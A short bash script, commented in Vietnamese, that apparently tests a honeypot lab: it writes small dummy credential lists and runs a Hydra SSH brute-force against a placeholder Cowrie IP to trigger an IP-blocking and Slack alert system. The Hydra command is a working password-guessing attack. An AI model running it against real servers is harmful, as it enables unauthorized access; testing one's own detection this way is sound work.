#!/bin/bash
echo "=================================================="
echo "🔥 SSH BRUTE-FORCE SIMULATOR (Hydra vs Cowrie) 🔥"
echo "=================================================="

# Thay đổi IP này thành IP máy ảo Honeypot của bạn
TARGET_IP="192.168.x.x"
# Cổng SSH của Cowrie (thường là 2222 hoặc 22 tùy bạn map)
PORT="22" 

echo "[*] Đang chuẩn bị từ điển (Wordlist)..."
echo -e "root\nadmin\nuser\nubuntu" > dummy_users.txt
echo -e "123456\npassword\nadmin123\nroot123" > dummy_pass.txt

echo "[*] Bắt đầu nã đạn bằng Hydra vào $TARGET_IP:$PORT..."
echo "[!] Cảnh báo: Lệnh này sẽ kích hoạt hệ thống chặn IP của iSOC!"
sleep 2

# Câu lệnh Hydra chuẩn mực
hydra -L dummy_users.txt -P dummy_pass.txt ssh://$TARGET_IP -s $PORT -t 4 -V

echo "\n[V] Hoàn tất tấn công. Hãy check cảnh báo trên Slack!"
# Dọn dẹp
rm dummy_users.txt dummy_pass.txt